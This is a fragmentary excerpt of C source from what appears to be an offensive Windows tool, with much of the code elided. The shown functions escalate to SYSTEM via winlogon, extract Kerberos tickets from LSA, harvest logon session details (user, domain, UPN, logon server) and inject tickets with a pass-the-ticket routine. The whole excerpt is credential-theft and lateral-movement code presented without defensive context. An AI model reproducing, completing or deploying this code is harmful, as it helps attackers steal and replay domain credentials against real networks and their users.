...
BOOL ElevateToSystem()
{
    ...
    memset( winlogon, 0, sizeof( winlogon ) );
    if (ProcessID == -1)
    {
...
VOID ExtractTicket( HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRING targetName, PUCHAR* ticket, PUINT32 ticketSize )
{
    ...
    if ( NT_SUCCESS( status ) && NT_SUCCESS( protocolStatus ) )
    {
        if ( NT_SUCCESS( protocolStatus ) )
        {
            ...
            if ( Ticket )
            {
                memcpy( Ticket, retrieveResponse->Ticket.EncodedTicket, TicketSize );
                *ticket     = Ticket;
...
{
    // UserName
    memcpy( Session->UserName, Data->UserName.Buffer, Data->UserName.Length );
    // Domain
    memcpy( Session->Domain, Data->LogonDomain.Buffer, Data->LogonDomain.Length );
    // LogonId
    ...
    memcpy( Session->AuthenticationPackage, Data->AuthenticationPackage.Buffer, Data->AuthenticationPackage.Length );
    // LogonServer
    memcpy( Session->LogonServer, Data->LogonServer.Buffer, Data->LogonServer.Length );
    // LogonServerDNSDomain
    memcpy( Session->LogonServerDNSDomain, Data->DnsDomainName.Buffer, Data->DnsDomainName.Length );
    // Upn
    memcpy( Session->Upn, Data->Upn.Buffer, Data->Upn.Length );
    // Tickets
...
{
    // ClientName
    memcpy( TicketInfo->ClientName, Data->ClientName.Buffer, Data->ClientName.Length );
    // ClientRealm
    memcpy( TicketInfo->ClientRealm, Data->ClientRealm.Buffer, Data->ClientRealm.Length );
    // ServerName
    memcpy( TicketInfo->ServerName, Data->ServerName.Buffer, Data->ServerName.Length );
    // ServerRealm
    memcpy( TicketInfo->ServerRealm, Data->ServerRealm.Buffer, Data->ServerRealm.Length );
    // StartTime
...
BOOL Ptt( HANDLE hToken, PBYTE Ticket, DWORD TicketSize, LUID luid )
{
    ...
    memcpy( RVA( PBYTE, submitRequest, submitRequest->KerbCredOffset ), Ticket, TicketSize );
